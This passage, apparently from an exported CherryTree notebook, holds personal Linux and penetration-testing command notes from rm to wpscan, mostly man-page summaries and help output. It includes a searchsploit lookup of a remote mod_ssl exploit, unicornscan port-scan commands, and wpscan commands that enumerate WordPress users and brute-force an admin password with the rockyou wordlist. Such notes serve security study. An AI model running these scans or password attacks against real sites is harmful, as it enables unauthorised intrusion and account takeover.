        <rich_text>rm (1)               - remove files or directories

rm -rf [Dir]	
		
-r: remove dirs
-f: force </rich_text>
      </node>
      <node name="rmdir" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285156" ts_lastsave="1695267078">
        <rich_text>rmdir (1)            - remove empty directories
rmdir (2)            - delete a directory
</rich_text>
      </node>
      <node name="route" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283680" ts_lastsave="1724722708">
        <rich_text scale="h1" weight="heavy">route</rich_text>
        <rich_text>

$ route


</rich_text>
        <rich_text weight="heavy"># Whatis</rich_text>
        <rich_text>
route (8)            - show / manipulate the IP routing table

</rich_text>
        <rich_text weight="heavy"># Help</rich_text>
        <rich_text>
Usage: route [-nNvee] [-FC] [&lt;AF&gt;]           List kernel routing tables
       route [-v] [-FC] {add|del|flush} ...  Modify routing table for AF.

       route {-h|--help} [&lt;AF&gt;]              Detailed usage syntax for specified AF.
       route {-V|--version}                  Display version/author and exit.

        -v, --verbose            be verbose
        -n, --numeric            don't resolve names
        -e, --extend             display other/more information
        -F, --fib                display Forwarding Information Base (default)
        -C, --cache              display routing cache instead of FIB

  &lt;AF&gt;=Use -4, -6, '-A &lt;af&gt;' or '--&lt;af&gt;'; default: inet
  List of possible address families (which support routing):
    inet (DARPA Internet) inet6 (IPv6) ax25 (AMPR AX.25) 
    netrom (AMPR NET/ROM) rose (AMPR ROSE) ipx (Novell IPX) 
    ddp (Appletalk DDP) x25 (CCITT X.25)


</rich_text>
      </node>
      <node name="sdiff" unique_id="125" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285214" ts_lastsave="1695267118">
        <rich_text>sdiff (1)            - side-by-side merge of file differences
</rich_text>
      </node>
      <node name="searchsploit" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283439" ts_lastsave="1727740701">
        <rich_text scale="h1" weight="heavy">$ searchsploit</rich_text>
        <rich_text>

searchsploit (1)     - Exploit Database Archive Search


$ sarchsploit OpenSSL 0.9.6b
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                    | unix/remote/</rich_text>
        <rich_text foreground="#ffffbebe6f6f">47080.c</rich_text>
        <rich_text>

$ sarchsploit -p </rich_text>
        <rich_text foreground="#ffffbebe6f6f">47080</rich_text>
        <rich_text>
Exploit: Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: </rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/47080">https://www.exploit-db.com/exploits/47080</rich_text>
        <rich_text>
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
 Verified: False
File Type: C source, ASCII text
</rich_text>
      </node>
      <node name="service" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284335" ts_lastsave="1729651382">
        <rich_text>service (8)          - run a System V init script

service --status-all
service ssh start|stop|status
</rich_text>
        <node name="Manual (man)" unique_id="404" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729651382" ts_lastsave="1729651418">
          <rich_text>SERVICE(8)                                                                    System Manager's Manual                                                                    SERVICE(8)

NAME
       service - run a System V init script

SYNOPSIS
       service SCRIPT COMMAND [OPTIONS]

       service --status-all

       service --help | -h | --version

DESCRIPTION
       service runs a System V init script or systemd unit in as predictable an environment as possible, removing most environment variables and with the current working directory
       set to /.

       The  SCRIPT  parameter specifies a System V init script, located in /etc/init.d/SCRIPT, or the name of a systemd unit. The existence of a systemd unit of the same name as a
       script in /etc/init.d will cause the unit to take precedence over the init.d script.  The supported values of COMMAND depend on the invoked script. service  passes  COMMAND
       and OPTIONS to the init script unmodified. For systemd units, start, stop, status, and reload are passed through to their systemctl/initctl equivalents.

       All  scripts  should  support  at least the start and stop commands.  As a special case, if COMMAND is --full-restart, the script is run twice, first with the stop command,
       then with the start command. Note, that unlike update-rc.d(8), service does not check /usr/sbin/policy-rc.d.

       service --status-all runs all init scripts, in alphabetical order, with the status command. The status is [ + ] for running services, [ - ] for stopped services and [  ?  ]
       for services without a status command.  This option only calls status for sysvinit jobs.

EXIT CODES
       service calls the init script and returns the status returned by it.

FILES
       /etc/init.d
              The directory containing System V init scripts.

       /{lib,run,etc}/systemd/system
              The directories containing systemd units.

ENVIRONMENT
       LANG, LANGUAGE, LC_CTYPE, LC_NUMERIC, LC_TIME, LC_COLLATE, LC_MONETARY, LC_MESSAGES, LC_PAPER, LC_NAME, LC_ADDRESS, LC_TELEPHONE, LC_MEASUREMENT, LC_IDENTIFICATION, LC_ALL,
       TERM, PATH
              The only environment variables passed to the init scripts.

SEE ALSO
       /etc/init.d/skeleton
       update-rc.d(8)
       init(8)
       invoke-rc.d(8)
       systemctl(1)

AUTHOR
       Miloslav Trmac &lt;mitr@redhat.com&gt;, Petter Reinholdtsen &lt;pere@hungry.com&gt;

       License: GNU General Public License v2 (GPLv2)

COPYRIGHT
       2006 Red Hat, Inc.,  Petter Reinholdtsen &lt;pere@hungry.com&gt;

Jan 2006</rich_text>
        </node>
      </node>
      <node name="shred" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284590" ts_lastsave="1684284692">
        <rich_text>you have info.txt with important data.
1 .$ shred info.txt
2 .$ rm info.txt -rf

the file is un-recoverable no more</rich_text>
      </node>
      <node name="shutdown" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285381" ts_lastsave="1695267435">
        <rich_text>shutdown (2)         - shut down part of a full-duplex connection
shutdown (8)         - Halt, power off or reboot the machine
</rich_text>
      </node>
      <node name="smbclient" unique_id="228" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287324" ts_lastsave="1684287328"/>
      <node name="sqlmap" unique_id="239" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529797" ts_lastsave="1684529797"/>
      <node name="ssh" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284251" ts_lastsave="1728250626"/>
      <node name="ssh-keygen" unique_id="375" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728250626" ts_lastsave="1728250709">
        <rich_text scale="h1" weight="heavy">ssh-keygen</rich_text>
        <rich_text>
ssh-keygen (1)       - OpenSSH authentication key utility



ssh-keygen -t rsa
# create a ssh key with RSA type (-t rsa)
</rich_text>
      </node>
      <node name="stat" unique_id="169" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285507" ts_lastsave="1695267576">
        <rich_text>stat (1)             - display file or file system status
stat (2)             - get file status
stat (3type)         - file status
</rich_text>
      </node>
      <node name="su" unique_id="162" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285469" ts_lastsave="1685330533">
        <rich_text>su &lt;newuser&gt;		# switch user
su - &lt;username&gt;		# switch user</rich_text>
      </node>
      <node name="sudo" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285466" ts_lastsave="1685330478">
        <rich_text>sudo -u &lt;username&gt; x  # run command as this user
sudo -u nobody zsh

sudo -l  # see privilages

sudo su - &lt;username&gt;
sudo su - marlinspike</rich_text>
      </node>
      <node name="systemctl" unique_id="168" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285501" ts_lastsave="1716696147">
        <rich_text>systemctl &lt;option&gt; &lt;servicename.service&gt;
options:
	start				- start a service
	stop				- stop a service
	enable			- enable the start_on_boot
	disable			- disable the start_on_boot

servicename:
	bluetooth -&gt; bluetooth.service</rich_text>
      </node>
      <node name="tac" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285104" ts_lastsave="1695267894">
        <rich_text>cat (1)              - </rich_text>
        <rich_text foreground="#6262a0a0eaea">concatenate</rich_text>
        <rich_text> files and print on the </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">standard</rich_text>
        <rich_text> output
tac (1)              - </rich_text>
        <rich_text foreground="#6262a0a0eaea">concatenate</rich_text>
        <rich_text> and print files in </rich_text>
        <rich_text foreground="#c0c01c1c2828">reverse</rich_text>
        <rich_text>


cat &gt; tac

cat : top to bottom
tac : bottom to top</rich_text>
      </node>
      <node name="tail" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285118" ts_lastsave="1685695844">
        <rich_text>tail &gt; head

tail -n 10  # 10 last lines
tail -c 10  # 10 lash chars</rich_text>
      </node>
      <node name="tar" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285284" ts_lastsave="1684285288"/>
      <node name="tcpdump" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283981" ts_lastsave="1695267925">
        <rich_text>tcpdump (8)          - dump traffic on a network
</rich_text>
      </node>
      <node name="telnet" unique_id="154" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285410" ts_lastsave="1695267941">
        <rich_text>telnet (1)           - user interface to the TELNET protocol
</rich_text>
      </node>
      <node name="time" unique_id="129" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285245" ts_lastsave="1695267953">
        <rich_text>time (2)             - get time in seconds
time (3am)           - time functions for gawk
time (7)             - overview of time and timers
</rich_text>
      </node>
      <node name="top" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284244" ts_lastsave="1695267995">
        <rich_text>top (1)              - display Linux processes

and some more with diffirent interface:
btop
htop</rich_text>
      </node>
      <node name="touch" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285139" ts_lastsave="1695268106">
        <rich_text>touch (1)            - change file timestamps
</rich_text>
      </node>
      <node name="traceroute" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283786" ts_lastsave="1695268112">
        <rich_text>traceroute (1)       - print the route packets trace to network host
tcptraceroute (8)    - print the route packets trace to network host
</rich_text>
      </node>
      <node name="tree" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285164" ts_lastsave="1695268125">
        <rich_text>tree (1)             - list contents of directories in a tree-like format.
</rich_text>
      </node>
      <node name="tshark" unique_id="230" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287533" ts_lastsave="1695268142">
        <rich_text>tshark (1)           - Dump and analyze network traffic
</rich_text>
      </node>
      <node name="type" unique_id="242" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685314694" ts_lastsave="1685314803">
        <rich_text weight="heavy">$ type cd</rich_text>
        <rich_text>
cd is a shell builtin

</rich_text>
        <rich_text weight="heavy">$ type ls</rich_text>
        <rich_text>
ls is an alias for ls --color=auto</rich_text>
      </node>
      <node name="ufw" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284270" ts_lastsave="1686722774">
        <rich_text>Linux Firewall</rich_text>
      </node>
      <node name="uname" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283694" ts_lastsave="1686722826">
        <rich_text scale="h1" weight="heavy">$ uname</rich_text>
        <rich_text>
uname (1)            - print system information
uname (2)            - get name and information about current kernel

sample:
uname -a  # a:all</rich_text>
      </node>
      <node name="unicornscan" unique_id="255" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686355506" ts_lastsave="1695268333">
        <rich_text scale="h1" weight="heavy">$ unicornscan</rich_text>
        <rich_text>
unicornscan Version 0.4.6b is a asynchronous network stimulus delivery/response recoring tool.


• </rich_text>
        <rich_text weight="heavy">scan all 64k ports:</rich_text>
        <rich_text>
  unicornscan -vmT &lt;targetip&gt;:a

• </rich_text>
        <rich_text weight="heavy">scan first 1k ports:</rich_text>
        <rich_text>
  unicornscan -vmT &lt;targetip&gt;:p

• </rich_text>
        <rich_text weight="heavy">scan in udp mode:</rich_text>
        <rich_text>
  unicornscan -vmU &lt;targetip&gt;</rich_text>
      </node>
      <node name="unzip" unique_id="138" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285293" ts_lastsave="1685744270"/>
      <node name="updatedb" unique_id="329" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724698453" ts_lastsave="1724698506">
        <rich_text>updatedb (8)         - update a database for plocate


# Example

$ locate ‘something’
$ updatedb
$ locate ‘something’</rich_text>
      </node>
      <node name="uptime" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284482" ts_lastsave="1724698453">
        <rich_text>uptime (1)           - Tell how long the system has been running.
</rich_text>
      </node>
      <node name="useradd" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284520" ts_lastsave="1684284527"/>
      <node name="userdell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284527" ts_lastsave="1684284532"/>
      <node name="usermod" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284507" ts_lastsave="1728275203">
        <rich_text>usermod


</rich_text>
        <rich_text weight="heavy">#</rich_text>
        <rich_text> usermod -aG sudo newuser
The -aG option tells usermod to add the user to the listed groups.</rich_text>
      </node>
      <node name="users" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284320" ts_lastsave="1684284328"/>
      <node name="vim" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285070" ts_lastsave="1684285094"/>
      <node name="vmstat" unique_id="167" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285490" ts_lastsave="1684285501"/>
      <node name="w" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284300" ts_lastsave="1695268402">
        <rich_text>w (1)                - Show who is logged on and what they are doing.

last (1)             - show a listing of last logged in users
</rich_text>
      </node>
      <node name="wapiti" unique_id="238" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529745" ts_lastsave="1695268452">
        <rich_text>wapiti (1)           - A web application vulnerability scanner in Python
</rich_text>
      </node>
      <node name="wash" unique_id="229" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287525" ts_lastsave="1695268479">
        <rich_text>Wash v1.6.6 WiFi Protected Setup Scan Tool</rich_text>
      </node>
      <node name="wc" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285094" ts_lastsave="1695268508">
        <rich_text>wc (1)               - print newline, word, and byte counts for each file
</rich_text>
      </node>
      <node name="wget" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284093" ts_lastsave="1695268520">
        <rich_text>wget &lt;URL&gt;wget (1)             - The non-interactive network downloader.
</rich_text>
      </node>
      <node name="whatis" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285020" ts_lastsave="1695268529">
        <rich_text>whatis (1)           - display one-line manual page descriptions
</rich_text>
      </node>
      <node name="whatmask" unique_id="354" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725162395" ts_lastsave="1725162663">
        <rich_text scale="h1" weight="heavy">whatmask</rich_text>
        <rich_text>
whatmask (1)         - Subnet mask notation conversion tool.

$ whatmask

whatmask &lt;IP address&gt;/&lt;netmask&gt;

</rich_text>
        <rich_text weight="heavy">$ whatmask 255.255.255.0</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#9a9a99999696">---------------------------------------------
       TCP/IP SUBNET MASK EQUIVALENTS
---------------------------------------------
CIDR = .....................: /24
Netmask = ..................: 255.255.255.0
Netmask (hex) = ............: 0xffffff00
Wildcard Bits = ............: 0.0.0.255
Usable IP Addresses = ......: 254</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">$ whatmask 1.1.1.1/20    </rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#9a9a99999696">------------------------------------------------
           TCP/IP NETWORK INFORMATION
------------------------------------------------
IP Entered = ..................: 1.1.1.1
CIDR = ........................: /20
Netmask = .....................: 255.255.240.0
Netmask (hex) = ...............: 0xfffff000
Wildcard Bits = ...............: 0.0.15.255
------------------------------------------------
Network Address = .............: 1.1.0.0
Broadcast Address = ...........: 1.1.15.255
Usable IP Addresses = .........: 4094
First Usable IP Address = .....: 1.1.0.1
Last Usable IP Address = ......: 1.1.15.254</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy"># HELP</rich_text>
        <rich_text>
whatmask v1.2, Copyright (C) 2001-2003 Joe Laffey &lt;joe@laffeycomputer.com&gt;
This binary compiled on Sep 10 2020 at 07:58:54
Visit: </rich_text>
        <rich_text link="webs http://www.laffeycomputer.com/software.html">http://www.laffeycomputer.com/software.html</rich_text>
        <rich_text> for updates.
whatmask comes with ABSOLUTELY NO WARRANTY; for details see the COPYING file
that accompained this distribution. This is free software, and you are welcome
to redistribute it under the terms of GNU PUBLIC LICENSE.

whatmask may be used two ways:

Given a mask:          whatmask &lt;CIDR bits&gt;
               - or -  whatmask &lt;subnet mask&gt;
               - or -  whatmask &lt;hex subnet mask&gt;
               - or -  whatmask &lt;wildcard bit mask&gt;
 NOTE: whatmask will autodetect the input and show you all four.

Given an ip/mask:      whatmask &lt;IP address&gt;/&lt;netmask&gt;
       &lt;netmask&gt; may be one of the following:
                       CIDR notation (e.g. "24")
                       </rich_text>
        <rich_text underline="single" weight="heavy">Netmask notation (e.g. "255.255.255.0")</rich_text>
        <rich_text>
                       Hex Netmask notation (e.g. "0xffffff00")
                       </rich_text>
        <rich_text underline="single" weight="heavy">Wildcard bits notation (e.g. "0.0.0.255")</rich_text>
        <rich_text>
 NOTE: whatmask will autodetect the netmask format.
</rich_text>
      </node>
      <node name="whatweb" unique_id="353" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725161993" ts_lastsave="1725162751">
        <rich_text scale="h1" weight="heavy">whatweb</rich_text>
        <rich_text>

$ whatweb

whatweb [options] &lt;URLs&gt;

</rich_text>
        <rich_text scale="h3" weight="heavy">#HELP</rich_text>
        <rich_text>
WhatWeb - Next generation web scanner version 0.5.5.
Developed by Andrew Horton (urbanadventurer) and Brendan Coles (bcoles)
Homepage: </rich_text>
        <rich_text link="webs https://www.morningstarsecurity.com/research/whatweb">https://www.morningstarsecurity.com/research/whatweb</rich_text>
        <rich_text>

Usage: whatweb [options] &lt;URLs&gt;

  &lt;TARGETs&gt;                     Enter URLs, hostnames, IP addresses, filenames or
                                IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x
                                format.
  --input-file=FILE, -i         Read targets from a file.

  --aggression, -a=LEVEL        Set the aggression level. Default: 1.
  1. Stealthy                   Makes one HTTP request per target and also
                                follows redirects.
  3. Aggressive                 If a level 1 plugin is matched, additional
                                requests will be made.

  --list-plugins, -l            List all plugins.
  --info-plugins, -I=[SEARCH]   List all plugins with detailed information.
                                Optionally search with a keyword.

  --verbose, -v                 Verbose output includes plugin descriptions.

Note: This is the short usage help. For the complete usage help use -h or --help.
</rich_text>
      </node>
      <node name="whereis" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285030" ts_lastsave="1695268561">
        <rich_text>whereis (1)          - locate the binary, source, and manual page files for a command
</rich_text>
      </node>
      <node name="which" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285039" ts_lastsave="1695268574">
        <rich_text>which (1)            - locate a command
</rich_text>
      </node>
      <node name="who" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284458" ts_lastsave="1695268605">
        <rich_text>who (1)              - show who is logged on
</rich_text>
      </node>
      <node name="whoami" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283690" ts_lastsave="1695268633">
        <rich_text>whoami (1)           - print effective user name
</rich_text>
      </node>
      <node name="whois" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283700" ts_lastsave="1695268630">
        <rich_text>whois (1)            - client for the whois directory service
</rich_text>
      </node>
      <node name="wifite" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283803" ts_lastsave="1695268653">
        <rich_text>wifite (1)           - Python script to automate wireless auditing using aircrack-ng tools
</rich_text>
      </node>
      <node name="wpscan" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283287" ts_lastsave="1728726187">
        <rich_text>WPSCAN : WordPress Security Scanner


</rich_text>
        <rich_text foreground="#3333d1d17a7a">wpscan</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--url</rich_text>
        <rich_text> target.com </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--enumerate</rich_text>
        <rich_text> u

</rich_text>
        <rich_text foreground="#3333d1d17a7a">wpscan</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--url</rich_text>
        <rich_text> target.com </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--username</rich_text>
        <rich_text> admin </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--wordlist</rich_text>
        <rich_text> /usr/share/wordlists/rockyou.txt </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">--threads</rich_text>
        <rich_text> 2

---
wpscan --url target.com --random-user-agent
wpscan --url target.com --stealthy
---
wpscan --url example.com -e u --passwords /path/to/password_file.txt</rich_text>
        <node name="--help" unique_id="394" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728724872" ts_lastsave="1728726077">
          <rich_text foreground="#18b2b2">wpscan</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#18b218">--help</rich_text>
          <rich_text> 
_______________________________________________________________ 
         __          _______   _____ 
         \ \        / /  __ \ / ____| 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ® 
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
            \  /\  /  | |     ____) | (__| (_| | | | | 
             \/  \/   |_|    |_____/ \___|\__,_|_| |_| 
 
         WordPress Security Scanner by the WPScan Team 
                         Version 3.8.25 
                                
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart 
_______________________________________________________________ 
 
Usage: wpscan [options] 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">        --url URL                                 The URL of the blog to scan </rich_text>
          <rich_text>
                                                  Allowed Protocols: http, https 
                                                  Default Protocol if none provided: http 
                                                  This option is mandatory unless update or help or hh or version is/are supplied 
    -h, --help                                    Display the simple help and exit 
        --hh                                      Display the full help and exit 
        --version                                 Display the version and exit 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -v, --verbose                                 Verbose mode </rich_text>
          <rich_text>
        --[no-]banner                             Whether or not to display the banner 
                                                  Default: true 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -o, --output FILE                             Output to FILE </rich_text>
          <rich_text>
    -f, --format FORMAT                           Output results in the format supplied 
                                                  Available choices: cli-no-colour, cli-no-color, json, cli 
        --detection-mode MODE                     Default: mixed 
                                                  Available choices: mixed, passive, aggressive 
        --user-agent, --ua VALUE 
        --random-user-agent, --rua                Use a random user-agent for each scan 
        --http-auth login:password 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -t, --max-threads VALUE                       The max threads to use 
                                                  Default: 5 </rich_text>
          <rich_text>
        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1. 
        --request-timeout SECONDS                 The request timeout in seconds 
                                                  Default: 60 
        --connect-timeout SECONDS                 The connection timeout in seconds 
                                                  Default: 30 
        --disable-tls-checks                      Disables SSL/TLS certificate verification, and downgrade to TLS1.0+ (requires cURL 7.66 for the latter) 
        --proxy protocol://IP:port                Supported protocols depend on the cURL installed 
        --proxy-auth login:password 
        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2] 
        --cookie-jar FILE-PATH                    File to read and write cookies 
                                                  Default: /tmp/wpscan/cookie_jar.txt 
        --force                                   Do not check if the target is running WordPress or returns a 403 
        --[no-]update                             Whether or not to update the Database 
        --api-token TOKEN                         The WPScan API Token to display vulnerability data, available at https://wpscan.com/profile 
        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content" 
        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins" 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -e, --enumerate [OPTS]                        Enumeration Process </rich_text>
          <rich_text>
                                                  Available Choices: 
                                                   vp   Vulnerable plugins 
                                                   ap   All plugins 
                                                   p    Popular plugins 
                                                   vt   Vulnerable themes 
                                                   at   All themes 
                                                   t    Popular themes 
                                                   tt   Timthumbs 
                                                   cb   Config backups 
                                                   dbe  Db exports 
                                                   u    User IDs range. e.g: u1-5 
                                                        Range separator to use: '-' 
                                                        Value if no argument supplied: 1-10 
                                                   m    Media IDs range. e.g m1-15 
                                                        Note: Permalink setting must be set to "Plain" for those to be detected 
                                                        Range separator to use: '-' 
                                                        Value if no argument supplied: 1-100 
                                                  Separator to use between the values: ',' 
                                                  Default: All Plugins, Config Backups 
                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m 
                                                  Incompatible choices (only one of each group/s can be used): 
                                                   - vp, ap, p 
                                                   - vt, at, t 
        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration. 
                                                  Both the headers and body are checked. Regexp delimiters are not required. 
